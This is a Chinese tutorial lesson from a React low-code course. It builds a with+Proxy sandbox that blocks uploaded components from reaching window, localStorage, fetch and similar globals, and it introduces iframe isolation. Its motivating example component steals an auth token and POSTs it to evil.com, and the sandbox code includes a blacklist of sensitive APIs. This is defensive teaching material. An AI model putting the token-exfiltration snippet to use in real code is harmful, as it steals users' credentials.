---
title: Day 7 - 沙箱与安全隔离
---

# Day 7：沙箱与安全隔离

## 今天完成什么

1. 用 `with` + `Proxy` 实现一个轻量级沙箱
2. 拦截用户组件对 `window`、`document`、`localStorage` 等敏感对象的访问
3. 给用户组件一份"白名单 API"，只放行安全的东西
4. 了解更强的 iframe 隔离方案（原理讲清楚，作为进阶）

## 接在昨天哪里

昨天用户组件能引用外部库了，但也留下一个大坑：

```tsx
export default function Evil() {
  // 偷 token
  const token = localStorage.getItem('auth_token');
  fetch('https://evil.com/steal', { method: 'POST', body: token });

  // 或者直接把页面搞崩
  while (true) {}

  return <div>看起来人畜无害</div>;
}
```

现在这段代码能**畅通无阻**地执行——因为 `new Function` 执行的代码和你的应用共享同一个全局作用域。

今天要做的：**给用户代码套一层沙箱，把危险的门都关上**。

## 核心概念

### 1. 为什么 `new Function` 不安全

```typescript
const fn = new Function('return window.localStorage');
fn(); // 直接拿到 localStorage
```

`new Function` 创建的函数，作用域链顶端就是全局作用域。用户代码里写 `window`、`localStorage`、`document`，全都能访问到真家伙。

### 2. `with` 语句改写作用域

`with(obj) { ... }` 会把 `obj` 的属性变成块内的"局部变量"：

```javascript
with ({ x: 1 }) {
  console.log(x); // 1，其实是 obj.x
}
```

关键点：块里出现的**任何标识符**，都会先去 `obj` 上找。我们就利用这一点，把用户代码包进 `with(sandbox)`，让所有变量访问都先经过我们控制的 `sandbox`。

### 3. `Proxy` 拦截一切访问

光有 `with` 还不够——找不到的变量还会往外层作用域漏。配合 `Proxy` 的两个陷阱：

- `has`：永远返回 `true`，骗 `with` "所有变量我这都有"，堵住外漏
- `get`：真正取值时，命中黑名单就抛错，否则正常返回

```javascript
const sandbox = new Proxy(context, {
  has: () => true,                 // 拦截所有变量查找
  get: (target, key) => {
    if (BLACKLIST.has(key)) {
      throw new Error(`禁止访问：${String(key)}`);
    }
    return target[key];
  }
});
```

### 4. 白名单优于黑名单

黑名单（列出禁止项）总会漏。更稳的是白名单：**只把明确安全的东西放进 context，其余一律 `undefined`**。

我们两者结合：白名单提供安全 API，黑名单再兜底拦截几个高危关键字，双保险。

### 5. 严格模式的坑

`with` 在严格模式（`"use strict"`）下是**语法错误**。所以沙箱执行的代码不能带 `"use strict"`——这跟 Day 2 里 `executeComponent` 用的 `"use strict"` 冲突，今天要专门处理。

## 动手前的目录

今天会新增：

```text
src/
└─ utils/
   └─ sandbox.ts        # 沙箱执行环境 [新增]
```

还会修改：

```text
src/
└─ utils/
   └─ compiler.ts       # executeComponent 改用沙箱 [修改]
```

## 分步实现

### 第 1 步：实现沙箱

新建 `src/utils/sandbox.ts`：

```typescript
import { resolveExternal } from './externalModules';

/**
 * 高危标识符黑名单
 * 用户组件访问这些一律抛错
 */
const BLACKLIST = new Set([
  'window',
  'globalThis',
  'self',
  'parent',
  'top',
  'document',
  'localStorage',
  'sessionStorage',
  'indexedDB',
  'cookie',
  'fetch',
  'XMLHttpRequest',
  'WebSocket',
  'eval',
  'Function',        // 防止用户再造一个 new Function 逃逸
  'importScripts',
]);

/**
 * 白名单 API：明确安全、允许用户使用的全局能力
 */
function createSafeGlobals(React: any) {
  return {
    React,
    // 安全的内置对象
    Math,
    JSON,
    Date,
    Array,
    Object,
    String,
    Number,
    Boolean,
    RegExp,
    Map,
    Set,
    Promise,
    // 受控的 console（可以换成收集日志的版本）
    console: {
      log: (...args: any[]) => console.log('[组件]', ...args),
      warn: (...args: any[]) => console.warn('[组件]', ...args),
      error: (...args: any[]) => console.error('[组件]', ...args),
    },
    // 定时器允许，但生产环境应该做数量/时长限制
    setTimeout,
    clearTimeout,
  };
}

/**
 * 在沙箱里执行编译后的组件代码
 */
export function executeInSandbox(
  compiledCode: string,
  React: any
): any {
  const safeGlobals = createSafeGlobals(React);

  // __require：只允许拿预置的外部库，且外部库也过一遍沙箱心智
  const requireFn = (name: string) => {
    if (name === 'react') return React;
    return resolveExternal(name);
  };

  // 构造 Proxy 作为 with 的作用域对象
  const sandbox = new Proxy(
    { ...safeGlobals, __require: requireFn },
    {
      // 骗 with：所有标识符都"存在"，阻止向外层作用域查找
      has: () => true,
      get: (target, key: string) => {
        // 黑名单直接拦截
        if (BLACKLIST.has(key)) {
          throw new Error(`沙箱拦截：禁止访问 "${key}"`);
        }
        // Symbol.unscopables 必须返回 undefined，否则 with 行为异常
        if (key === Symbol.unscopables) return undefined;
        return (target as any)[key];
      },
    }
  );

  // 注意：不能加 "use strict"，否则 with 报语法错误
  const fn = new Function(
    'sandbox',
    `with (sandbox) { return ${compiledCode}; }`
  );

  const component = fn(sandbox);

  if (typeof component !== 'function') {
    throw new Error('编译结果不是一个函数');
  }

  return component;
}
```

### 第 2 步：编译器改用沙箱

修改 `src/utils/compiler.ts`，让 `executeComponent` 走沙箱：

```typescript
import { executeInSandbox } from './sandbox';

export function executeComponent(compiledCode: string): React.ComponentType<any> {
  try {
    // [修改] 不再直接 new Function 裸执行，改走沙箱
    const component = executeInSandbox(compiledCode, React);
    return component as React.ComponentType<any>;
  } catch (error: any) {
    throw new Error(`执行组件代码失败: ${error.message}`);
  }
}
```

`compileComponent`、`compileAndExecute` 不用动。因为所有组件（单文件 / 多文件 / 带外部库的）最终都经过 `executeComponent`，沙箱就统一生效了。

### 第 3 步：处理组件内的敏感访问时机

注意一个细节：沙箱的 `get` 拦截发生在**变量读取时**。

```tsx
export default function Demo() {
  // 这行在组件渲染时才执行，那时也在沙箱作用域里吗？
  const data = localStorage.getItem('x');
  return <div>{data}</div>;
}
```

用 `with` 包裹后，整个组件函数体（包括渲染时执行的语句）都在 `with(sandbox)` 的作用域链里，所以渲染时访问 `localStorage` 依然会被拦截。✅

但有个例外——**异步回调**里的访问可能逃逸：

```tsx
setTimeout(() => {
  // 这个回调执行时，with 作用域可能已经不在链上了
  window.localStorage.getItem('x');
}, 1000);
```

这是 `with + Proxy` 方案的固有局限，Day 7 的沙箱是**教学级**的，挡得住直接访问，挡不住所有异步逃逸。生产级隔离要靠 iframe / Web Worker。

### 第 4 步（进阶了解）：iframe 强隔离

真正想隔离干净，用带 `sandbox` 属性的 iframe：

```typescript
function createIframeSandbox(compiledCode: string) {
  const iframe = document.createElement('iframe');
  // allow-scripts 允许执行 JS，但不给 allow-same-origin
  // → iframe 里的代码访问不到父页面的 cookie / localStorage
  iframe.sandbox.add('allow-scripts');
  iframe.style.display = 'none';
  iframe.srcdoc = `
    <script>
      try {
        ${compiledCode}
        // 通过 postMessage 把结果传回父页面
        parent.postMessage({ type: 'ready' }, '*');
      } catch (e) {
        parent.postMessage({ type: 'error', message: e.message }, '*');
      }
    <\/script>
  `;
  document.body.appendChild(iframe);
  return iframe;
}
```

iframe 隔离更彻底，但**通信复杂**（要用 postMessage 序列化传数据，React 元素没法直接传），实现成本高很多。本课程用 `with + Proxy` 讲原理，iframe 作为你以后深入的方向。

## 完整代码

今天的文件清单：

1. **新增** `src/utils/sandbox.ts`（完整代码见第 1 步）
2. **修改** `src/utils/compiler.ts`（`executeComponent` 改调 `executeInSandbox`）

## 运行效果

### 正常组件：照常工作

先确认之前的组件没被误伤——重新上传 Day 6 的 `SearchBox`，应该照常渲染、防抖照常触发。它用的是 `React.useState`、`lodash`、`dayjs`，全在白名单/`__require` 里，畅通。

### 恶意组件：被拦截

写一个"坏"组件 `EvilComponent`：

**meta.json**：
```json
{
  "name": "EvilComponent",
  "displayName": "可疑组件",
  "description": "尝试访问敏感 API",
  "category": "basic",
  "version": "1.0.0",
  "props": {}
}
```

**EvilComponent.tsx**：
```tsx
import React from 'react';

export default function EvilComponent() {
  // 尝试偷本地存储
  const token = localStorage.getItem('auth_token');
  return <div>token: {token}</div>;
}
```

上传并选中它，预览区应该显示错误，控制台报：

```text
执行组件代码失败: 沙箱拦截：禁止访问 "localStorage"
```

再试试 `window`、`document.cookie`、`fetch`，都会被同样拦下。

## 常见错误

### 错误 1：`Uncaught SyntaxError: Strict mode code may not include a with statement`

**原因**：执行代码里带了 `"use strict"`。

**解决**：确认 `sandbox.ts` 里的 `new Function` **没有** `"use strict"`，Day 2 那版带 strict 的执行逻辑已经被替换掉了。

### 错误 2：正常组件也报"禁止访问 xxx"

**原因**：黑名单太激进，把组件正常要用的东西也拦了。

**解决**：检查黑名单，别把 `React`、`Math`、`console` 之类误列进去。它们该在白名单。

### 错误 3：`Symbol(Symbol.unscopables)` 相关的怪异行为

**原因**：`with` 会读取对象的 `Symbol.unscopables`，Proxy 的 `get` 没处理它。

**解决**：`get` 里对 `Symbol.unscopables` 返回 `undefined`（第 1 步代码已处理）。

### 错误 4：组件里 `useState` 报错 `React.useState is not a function`

**原因**：白名单里的 `React` 没传对，或者被黑名单误拦。

**解决**：确认 `createSafeGlobals(React)` 收到的是真正的 React，且 `React` 不在黑名单里。

## 动手改一改

1. **收集组件日志**：把白名单里的 `console.log` 改成写进一个数组，在界面上显示"组件输出面板"
2. **拦截提示优化**：被拦截时，在预览区显示一个友好的红色警告卡片，而不是抛异常白屏
3. **可配置白名单**：让平台管理员能配置"这个组件允许用哪些 API"，实现按组件授权

## 验收清单

- [ ] 正常组件（SearchBox 等）在沙箱下照常工作
- [ ] 组件访问 `localStorage` 被拦截并报错
- [ ] 组件访问 `window` / `document` / `fetch` 被拦截
- [ ] 白名单里的 `Math` / `JSON` / `console` 能正常用
- [ ] 外部库（lodash / dayjs）仍能通过 `__require` 使用
- [ ] 理解 `with + Proxy` 的局限，知道 iframe 是更强方案

## 今日总结

### 学到了什么

1. **`new Function` 的安全风险**：共享全局作用域
2. **`with` + `Proxy` 沙箱**：`has` 堵外漏，`get` 拦黑名单
3. **白名单 > 黑名单**：只放行明确安全的 API
4. **严格模式与 with 冲突**：沙箱代码不能带 `"use strict"`
5. **教学级 vs 生产级**：`with` 挡直接访问，iframe/Worker 才是真隔离

### 关键代码

```typescript
const sandbox = new Proxy(safeGlobals, {
  has: () => true,
  get: (t, k) => {
    if (BLACKLIST.has(k)) throw new Error(`禁止访问 ${k}`);
    return t[k];
  }
});
new Function('sandbox', `with (sandbox) { return ${code}; }`)(sandbox);
```

### 今天的限制

- 异步回调里的访问可能逃逸（`with` 作用域固有局限）
- 挡不住死循环 `while(true)`（需要 Worker + 超时才能治）
- 不是生产级安全，只作教学演示

### 明天做什么

Day 8（最后一天）会做版本管理和热更新：同一个组件保留多个版本，上传新版本预览自动刷新，还能回滚到旧版本。

---

**安全防线搭起来了！虽然是教学级，但你已经理解了浏览器端沙箱的核心原理。**

<ProgressButton courseId="react-lowcode-advanced-custom-components" dayId="day-07-sandbox-isolation" />
